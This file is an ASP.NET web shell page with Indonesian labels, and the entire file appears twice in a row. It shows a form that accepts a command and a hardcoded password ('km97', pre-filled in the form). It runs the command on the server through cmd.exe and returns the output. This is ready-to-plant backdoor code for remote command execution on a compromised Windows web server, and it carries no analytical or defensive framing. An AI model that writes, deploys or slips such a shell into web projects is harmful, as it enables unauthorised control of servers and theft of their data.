<%@ Page Language="C#" %>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
    private const string SANDI = "km97";

    private const string ATAS = "<html>\n<head>\n<title>Memproses Perintah..</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string BAWAH = "</body>\n</html>\n";

    protected void Page_Load(object sender, EventArgs e)
    {
    }

    protected void TombolPerintah_Klik(object sender, EventArgs e)
    {
       if (TeksKode.Text != SANDI)
       {
           return;
       }
         
        Response.Write(ATAS);
        Response.Write("<pre>");
        Response.Write(Server.HtmlEncode(this.ExecuteCommand(TeksPerintah.Text)));
        Response.Write("</pre>");
        Response.Write(BAWAH);
    }

    private string ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c " + command;
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.UseShellExecute = false;

            Process process = Process.Start(processStartInfo);
            using (StreamReader streamReader = process.StandardOutput)
            {
                string ret = streamReader.ReadToEnd();

                return ret;
            }
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
<title>CMD Shell Aspx - km97</title>
</head>
<body>
<center>
<form id="formCommand" runat="server">
<asp:TextBox id="TeksKode" runat="server" size="3" Text="km97" style="color:lime; margin:0; background:black; border:1px solid #ffffff;"></asp:TextBox>
<BR>
<asp:TextBox ID="TeksPerintah" runat="server" size="50" Text="kode cmd" style="color:yellow; margin:0; background:black; border:1px solid #ffffff;"></asp:TextBox>
<BR>
<asp:Button ID="TombolPerintah" runat="server" OnClick="TombolPerintah_Klik" Text="Laksanakan" style="color:silver; margin:0; background:black; border:1px solid #ffff00;" />
</form>
</center>
</body>
</html><%@ Page Language="C#" %>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
    private const string SANDI = "km97";

    private const string ATAS = "<html>\n<head>\n<title>Memproses Perintah..</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string BAWAH = "</body>\n</html>\n";

    protected void Page_Load(object sender, EventArgs e)
    {
    }

    protected void TombolPerintah_Klik(object sender, EventArgs e)
    {
       if (TeksKode.Text != SANDI)
       {
           return;
       }
         
        Response.Write(ATAS);
        Response.Write("<pre>");
        Response.Write(Server.HtmlEncode(this.ExecuteCommand(TeksPerintah.Text)));
        Response.Write("</pre>");
        Response.Write(BAWAH);
    }

    private string ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c " + command;
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.UseShellExecute = false;

            Process process = Process.Start(processStartInfo);
            using (StreamReader streamReader = process.StandardOutput)
            {
                string ret = streamReader.ReadToEnd();

                return ret;
            }
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
<title>CMD Shell Aspx - km97</title>
</head>
<body>
<center>
<form id="formCommand" runat="server">
<asp:TextBox id="TeksKode" runat="server" size="3" Text="km97" style="color:lime; margin:0; background:black; border:1px solid #ffffff;"></asp:TextBox>
<BR>
<asp:TextBox ID="TeksPerintah" runat="server" size="50" Text="kode cmd" style="color:yellow; margin:0; background:black; border:1px solid #ffffff;"></asp:TextBox>
<BR>
<asp:Button ID="TombolPerintah" runat="server" OnClick="TombolPerintah_Klik" Text="Laksanakan" style="color:silver; margin:0; background:black; border:1px solid #ffff00;" />
</form>
</center>
</body>
</html>
